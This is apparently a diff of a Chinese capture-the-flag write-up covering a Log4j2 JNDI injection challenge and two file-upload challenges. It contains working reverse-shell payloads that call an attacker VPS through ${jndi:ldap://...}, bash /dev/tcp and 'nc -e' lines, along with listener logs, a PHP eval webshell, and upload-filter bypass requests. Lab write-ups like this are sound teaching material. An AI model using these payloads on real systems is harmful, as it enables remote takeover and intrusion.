+在Google Cloud启动VPS，然后在本地主机用`gcloud`连接VPS。攻击机VPS的IP是34.19.3.124。
 
-`t0ur1st=system('cat /flag.txt');`查看`/flag.txt`文件内容。
+```bash
+gcloud compute ssh --zone "us-west1-a" "ctf-vps" --project "project-ip"
+```
 
-> ctfshow{c5187c11-5ff4-4558-b402-32bcf09325d7}
+在VPS中安装相应的环境，如OpenLDAP服务端等。
 
-提交`ctfshow{c5187c11-5ff4-4558-b402-32bcf09325d7}`即可。
+```bash
+sudo apt update && sudo apt upgrade -y
+sudo apt install slapd ldap-utils -y
+sudo systemctl start slapd  # 启动LDAP服务
+sudo systemctl enable slapd # 设置开机启动
+sudo systemctl status slapd # 检查服务状态
+sudo ufw allow 389/tcp    # LDAP
+sudo ufw allow 636/tcp    # LDAPS（如果配置了 TLS）
+sudo ufw allow 1389/tcp
+sudo ufw allow 8888/tcp
+sudo ufw enable
+sudo apt install netcat-openbsd -y   # nc
+sudo apt install maven openjdk-8-jdk -y  # 安装Java1.8和Maven
+sudo update-alternatives --config java  # 切换Java版本为1.8
+```
+
+在`GitHub`上搜索并安装`JNDIExploit`。
+
+```bash
+tyd@ctf-vps:~$ git clone https://github.com/zzwlpx/JNDIExploit.git
+tyd@ctf-vps:~$ cd JNDIExploit
+tyd@ctf-vps:~/JNDIExploit$ mvn clean package -DskipTests # 编译打包
+tyd@ctf-vps:~/JNDIExploit$ ls target/JNDIExploit-*.jar  # 检查是否完成打包
+target/JNDIExploit-1.0-SNAPSHOT.jar
+tyd@ctf-vps:~/JNDIExploit$ cp target/JNDIExploit-1.0-SNAPSHOT.jar ~/JNDIExploit.jar
+```
+
+启动`JNDIExploit`服务并监听1389和8888端口端口，以利用`Log4j2`远程代码执行漏洞。其中，`LDAP`服务会响应靶机的`JNDI`查询，当存在漏洞的应用解析`user=${jndi:ldap://34.19.3.124:1389/xx`时会连接此服务，`LDAP`服务会返回一个恶意Java类的下载地址URL。而`HTTP`服务用于托管恶意的`.class`文件（如反弹shell的`payload`），靶机从`LDAP`服务获取到URL后，会请求`HTTP`服务下载并执行该类。
+
+```bash
+tyd@ctf-vps:~$ java -jar JNDIExploit.jar -i 34.19.3.124 -p 8888
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8888...
+```
+
+新开一个VPS窗口，使用`nc`工具同时监听9999端口，用于接受反弹shell。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+```
+
+该漏洞的`POC`是`user=${jndi:ldap://34.19.3.124/TomcatBypass/TomcatEcho}`，用`Burp Suite`发送`POST`请求，该`POC`能显示靶机的源代码信息，而不再是说用户名或密码错误。
+
+```html
+HTTP/1.1 200 
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Last-Modified: Fri, 10 Dec 2021 15:46:46 GMT
+Accept-Ranges: bytes
+Content-Type: text/html
+Content-Language: zh-CN
+Content-Length: 4781
+Date: Mon, 26 Jan 2026 15:55:39 GMT
+Keep-Alive: timeout=60
+Connection: keep-alive
+
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Java Log4j2 RCE</title>
+    <link type="text/css" href="/style.css" rel="stylesheet"/>
+</head>
+<body>
+
+<script src="/anime.min.js"></script>
+<script src="/md5.min.js"></script>
+<script type="text/javascript">
+    function formSubmit() {
+        var user = document.getElementById('user').value;
+        if (user==""){
+            document.getElementById('response').innerHTML = "用户名为空";
+            return ;
+        }
+        var pwd = document.getElementById('password').value;
+        if (pwd==""){
+            document.getElementById('response').innerHTML = "密码为空";
+            return ;
+        }
+        pwd = md5(pwd + "hack");
+        var body = "user=" + user + "&pwd=" + pwd;
+        var httpRequest = new XMLHttpRequest();
+        httpRequest.open('POST', '/login', true);
+        httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        httpRequest.send(body);
+        httpRequest.onreadystatechange = function () {
+            if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+                var responseText = httpRequest.responseText;
+                document.getElementById('response').innerHTML = responseText;
+            }
+        };
+    }
+</script>
+
+<div class="page">
+    <div class="container">
+        <div class="left">
+            <div class="login">登录</div>
+            <div class="eula" id="response">欢迎使用！</div>
+        </div>
+        <div class="right">
+            <svg viewBox="0 0 320 300">
+                <defs>
+                    <linearGradient
+                            inkscape:collect="always"
+                            id="linearGradient"
+                            x1="13"
+                            y1="193.49992"
+                            x2="307"
+                            y2="193.49992"
+                            gradientUnits="userSpaceOnUse">
+                        <stop
+                                style="stop-color:#ff00ff;"
+                                offset="0"
+                                id="stop876"/>
+                        <stop
+                                style="stop-color:#ff0000;"
+                                offset="1"
+                                id="stop878"/>
+                    </linearGradient>
+                </defs>
+                <path d="m 40,120.00016 239.99984,-3.2e-4 c 0,0 24.99263,0.79932 25.00016,35.00016 0.008,34.20084 -25.00016,35 -25.00016,35 h -239.99984 c 0,-0.0205 -25,4.01348 -25,38.5 0,34.48652 25,38.5 25,38.5 h 215 c 0,0 20,-0.99604 20,-25 0,-24.00396 -20,-25 -20,-25 h -190 c 0,0 -20,1.71033 -20,25 0,24.00396 20,25 20,25 h 168.57143"/>
+            </svg>
+            <div class="form" method="post">
+                <label for="user">用户名</label>
+                <input type="user" id="user">
+                <label for="password">密码</label>
+                <input type="password" id="password">
+                <input type="submit" id="submit" value="提交" onclick="formSubmit()">
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    var current = null;
+    document.querySelector('#user').addEventListener('focus', function (e) {
+        if (current) current.pause();
+        current = anime({
+            targets: 'path',
+            strokeDashoffset: {
+                value: 0,
+                duration: 700,
+                easing: 'easeOutQuart'
+            },
+            strokeDasharray: {
+                value: '240 1386',
+                duration: 700,
+                easing: 'easeOutQuart'
+            }
+        });
+    });
+    document.querySelector('#password').addEventListener('focus', function (e) {
+        if (current) current.pause();
+        current = anime({
+            targets: 'path',
+            strokeDashoffset: {
+                value: -336,
+                duration: 700,
+                easing: 'easeOutQuart'
+            },
+            strokeDasharray: {
+                value: '240 1386',
+                duration: 700,
+                easing: 'easeOutQuart'
+            }
+        });
+    });
+    document.querySelector('#submit').addEventListener('focus', function (e) {
+        if (current) current.pause();
+        current = anime({
+            targets: 'path',
+            strokeDashoffset: {
+                value: -730,
+                duration: 700,
+                easing: 'easeOutQuart'
+            },
+            strokeDasharray: {
+                value: '530 1386',
+                duration: 700,
+                easing: 'easeOutQuart'
+            }
+        });
+    });</script>
+</body>
+</html>
+```
+
+常规做法是用`bash -i >& /dev/tcp/34.19.3.124/9999 0>&1`命令反弹`shell`，简单来说是将标准输出重定向到`/dev/tcp/34.19.3.124/9999`端口文件中，即将靶机的标准输出通过`/dev/tcp`建立`Socket`连接重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此靶机的标准输入也就重定向到了攻击机，所以我们能在攻击机（我们的VPS）中输入命令并看到靶机的执行结果。将反弹`shell`的命令进行`base64`编码再`URL`编码一次。
+
+```python
+>>> from base64 import b64encode
+>>> s = 'bash -i >& /dev/tcp/34.19.3.124/9999 0>&1'
+>>> b64encode(s.encode()).decode()
+'YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xOS4zLjEyNC85OTk5IDA+JjE='
+>>> from urllib.parse import quote
+>>> quote('YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xOS4zLjEyNC85OTk5IDA+JjE=')
+'YmFzaCAtaSA%2BJiAvZGV2L3RjcC8zNC4xOS4zLjEyNC85OTk5IDA%2BJjE%3D'
+```
+
+构造`Payload`写入靶机的输入框中发送`GET`请求，`Payload`注入后`shell`会被反弹到`nc`监听的端口。
+
+```
+${jndi:ldap://34.19.3.124:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8zNC4xOS4zLjEyNC85OTk5IDA%2BJjE%3D}
+```
+
+我这是延用了打CTFSHOW的`Log4j复现`题的做法，然而VPS上居然监听失败了？！
+
+```bash
+tyd@ctf-vps:~$ java -jar JNDIExploit.jar -i 34.19.3.124 -p 8888
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8888...
+[+] Received LDAP Query: TomcatBypass/Command/Base64/YmFzaCAtaSA JiAvZGV2L3RjcC8zNC4xOS4zLjEyNC85OTk5IDA JjE=
+[+] Paylaod: command
+[!] Exception: Incorrect params: TomcatBypass/Command/Base64/YmFzaCAtaSA JiAvZGV2L3RjcC8zNC4xOS4zLjEyNC85OTk5IDA JjE=
+```
+
+根据bugku的题目描述`/dev/tcp × ； nc -e x ; nc a.cc 1234 -e √ ;`，应该是要用`nc`反弹shell。将`nc 34.19.3.124 9999 -e /bin/sh`用`Python`进行`base64`编码，全是字母无需再`URL`编码。
+
+```python
+>>> from base64 import b64encode
+>>> b64encode(b'nc 34.19.3.124 9999 -e /bin/sh')
+b'bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No'
+```
+
+用`base64`编码结果构造`LDAP`请求，这次一定好吧。
+
+```
+${jndi:ldap://34.19.3.124:1389/Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No}
+```
+
+攻击机的`JNDIExploit`服务监听到的内容如下：
+
+```
+tyd@ctf-vps:~java -jar JNDIExploit.jar -i 34.19.3.124 -p 8888
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8888...
+[+] Received LDAP Query: Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No
+[+] Paylaod: command
+[+] Command: nc 34.19.3.124 9999 -e /bin/sh
+[+] Sending LDAP ResourceRef result for Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No with basic remote reference payload
+[+] Send LDAP reference result for Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No redirecting to http://34.19.3.124:8888/ExploitBZOfiB6iwB.class
+[+] New HTTP Request From /171.80.2.169:53536  /ExploitBZOfiB6iwB.class
+[+] Receive ClassRequest: ExploitBZOfiB6iwB.class
+[+] Response Code: 200
+[+] Received LDAP Query: Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No
+[+] Paylaod: command
+[+] Command: nc 34.19.3.124 9999 -e /bin/sh
+[+] Sending LDAP ResourceRef result for Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No with basic remote reference payload
+[+] Send LDAP reference result for Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No redirecting to http://34.19.3.124:8888/ExploitnAVoGEkfWJ.class
+[+] New HTTP Request From /171.80.2.169:53536  /ExploitnAVoGEkfWJ.class
+[+] Receive ClassRequest: ExploitnAVoGEkfWJ.class
+[+] Response Code: 200
+[+] Received LDAP Query: Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No
+[+] Paylaod: command
+[+] Command: nc 34.19.3.124 9999 -e /bin/sh
+[+] Sending LDAP ResourceRef result for Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No with basic remote reference payload
+[+] Send LDAP reference result for Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No redirecting to http://34.19.3.124:8888/ExploitrHlaS2mL5a.class
+[+] New HTTP Request From /171.80.2.169:57862  /ExploitrHlaS2mL5a.class
+[+] Receive ClassRequest: ExploitrHlaS2mL5a.class
+[+] Response Code: 200
+[+] Received LDAP Query: Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No
+[+] Paylaod: command
+[+] Command: nc 34.19.3.124 9999 -e /bin/sh
+[+] Sending LDAP ResourceRef result for Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No with basic remote reference payload
+[+] Send LDAP reference result for Basic/Command/Base64/bmMgMzQuMTkuMy4xMjQgOTk5OSAtZSAvYmluL3No redirecting to http://34.19.3.124:8888/ExploitMgczxIfB2u.class
+[+] New HTTP Request From /171.80.2.169:39104  /ExploitMgczxIfB2u.class
+[+] Receive ClassRequest: ExploitMgczxIfB2u.class
+[+] Response Code: 200
+```
+
+攻击机的`nc`监听到的反弹`shell`如下，输入`whoami && ls -l /`和`cat /flag`即可拿到`flag`。
+
+```
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 171.80.2.169 34559
+whoami && ls -l /
+root
+total 60
+drwxr-xr-x    2 root     root          4096 Mar  3  2017 bin
+drwxr-xr-x    5 root     root           340 Jan 26 15:27 dev
+drwxr-xr-x    1 root     root          4096 Jan 26 15:27 etc
+-r--r--r--    1 root     root            39 Jan 26 15:27 flag
+drwxr-xr-x    1 root     root          4096 Jan 26 15:27 home
+drwxr-xr-x    1 root     root          4096 Mar  3  2017 lib
+lrwxrwxrwx    1 root     root            12 Mar  3  2017 linuxrc -> /bin/busybox
+drwxr-xr-x    5 root     root          4096 Mar  3  2017 media
+drwxr-xr-x    2 root     root          4096 Mar  3  2017 mnt
+dr-xr-xr-x  241 root     root             0 Jan 26 15:27 proc
+drwx------    2 root     root          4096 Mar  3  2017 root
+drwxr-xr-x    2 root     root          4096 Mar  3  2017 run
+drwxr-xr-x    2 root     root          4096 Mar  3  2017 sbin
+drwxr-xr-x    2 root     root          4096 Mar  3  2017 srv
+-rwxrwxrwx    1 root     root           229 Dec 10  2021 start.sh
+dr-xr-xr-x   13 root     root             0 Jan 26 15:27 sys
+drwxrwxrwt    1 root     root          4096 Jan 26 15:28 tmp
+drwxr-xr-x    1 root     root          4096 Mar  3  2017 usr
+drwxr-xr-x    1 root     root          4096 Mar  3  2017 var
+cat /flag
+flag{7ddce3afd760b48f93ffeab618d4626b}
+```
+
+提交`flag{7ddce3afd760b48f93ffeab618d4626b}`即可。
+
+------
+
+### xxx二手交易市场
+
+先随便注册一个用户登录上去，然后上传头像这个功能存在文件上传漏洞。
+
+编写`PHP`一句话木马：
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+`base64`加密后得到字符串`PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==`。
+
+随便点击一张图片上传，然后修改图片信息为
+
+```
+image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
+```
+
+可以看到上传成功的响应头信息如下：
+
+```json
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sun, 07 Apr 2024 09:31:29 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+X-Powered-By: PHP/7.3.22
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 98
+
+{"code":1,"msg":"保存成功!","data":"\/Uploads\/heads\/8c9898401a38fdad.php","url":"","wait":3}
+```
+
+使用蚁剑连接靶机，打开虚拟终端。
+
+```bash
+$ find / -name flag*
+$ cat /var/www/html/flag
+flag{27be6f3753c7a1b12345a7a5a7d1127c}
+```
+
+提交`flag{27be6f3753c7a1b12345a7a5a7d1127c}`即可。
+
+------
+
+### 文件上传
+
+编写`PHP`一句话木马：
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+点击上传后，可以看到`Burp Suite`的请求如下：
+
+```
+POST /index.php HTTP/1.1
+Host: 114.67.175.224:12169
+Content-Length: 422
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://114.67.175.224:12169
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR2qZKqgQHD5pKJDR
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://114.67.175.224:12169/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=0fca72f2b297818af57ac74271ef370b
+Connection: close
+
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR
+Content-Disposition: form-data; name="file"; filename="6.php"
+Content-Type: application/octet-stream
+
+<?php @eval($_POST['t0ur1st']); ?>
+
+/*
+image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
+*/
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR--
+```
+
+请求头部的 `Content-Type` 内容，随便改个大写字母过滤掉，比如 `mulTipart/form-data`
+所上传的文件后缀改为 `.php4`，依次尝试`php4`，`phtml`，`phtm`，`phps`，`php5`（包括一些字母改变大小写）
+请求数据的 `Content-Type` 内容改为 `image/jpeg`。
+
+```
+POST /index.php HTTP/1.1
+Host: 114.67.175.224:12169
+Content-Length: 422
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://114.67.175.224:12169
+Content-Type: mulTipart/form-data; boundary=----WebKitFormBoundaryR2qZKqgQHD5pKJDR
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://114.67.175.224:12169/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=0fca72f2b297818af57ac74271ef370b
+Connection: close
+
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR
+Content-Disposition: form-data; name="file"; filename="6.php4"
+Content-Type: image/jpeg
+
+<?php @eval($_POST['t0ur1st']); ?>
+
+/*
+image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
+*/
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR--
+```
+
+上传成功后可以看到
+
+> Upload Success
+> Stored in: [upload/bugku07095101_5795.php4](http://114.67.175.224:12169/upload/bugku07095101_5795.php4)
+
+使用蚁剑连接靶机，打开虚拟终端。
+
+```bash
+$ find / -name flag*
+$ cat /flag
+flag{fbd8c508888c770a01c094a4ba2f4c00}
+```
+
+提交`flag{fbd8c508888c770a01c094a4ba2f4c00}`即可。
 
 ------
 
